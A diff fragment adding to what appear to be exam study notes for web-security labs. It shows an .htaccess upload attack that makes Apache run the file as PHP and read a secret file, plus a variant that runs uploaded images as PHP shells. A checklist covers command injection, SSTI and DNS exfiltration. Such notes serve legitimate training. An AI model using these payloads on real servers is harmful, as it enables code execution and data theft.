+```apache
+<Files ~ "^\.ht">
+Order allow,deny
+Allow from all
+</Files>
+
+# Make .htaccess file be interpreted as php file
+AddType application/x-httpd-php .htaccess
+```
+
+**Step 2:** Add PHP code to same .htaccess file
+```apache
+<Files ~ "^\.ht">
+Order allow,deny
+Allow from all
+</Files>
+
+AddType application/x-httpd-php .htaccess
+
+# PHP code below
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+**How it works:**
+1. First directive allows .htaccess to be accessed via web
+2. `AddType` makes Apache interpret .htaccess as PHP
+3. PHP code at bottom executes when .htaccess is accessed
+4. Visit `/files/avatars/.htaccess` to execute code
+
+**Alternative - Make images execute as PHP:**
+```apache
+AddType application/x-httpd-php .jpg .png .gif
+```
+Then upload `shell.jpg` with PHP code inside.
+
+---
+
+## Exam Tips
+
+1. **Use exiftool for polyglot** - Most reliable method
+2. **Read file directly** - `file_get_contents('/home/carlos/secret')`
+3. **Try multiple extensions** - `.php`, `.php5`, `.phtml`
+4. **Check upload directory** - Usually `/files/avatars/` or `/files/`
+5. **Add START/END markers** - Easy to find output in response
+
+---
+
 # Exam Patterns
 
 ## Stage 1: Get Access to Any User
@@ -958,3 +1969,7 @@ ${7*7}
 - [ ] Test feedback email for command injection
 - [ ] Test template expressions for SSTI
 - [ ] Try DNS exfiltration for blind vulnerabilities
+
+
+
+
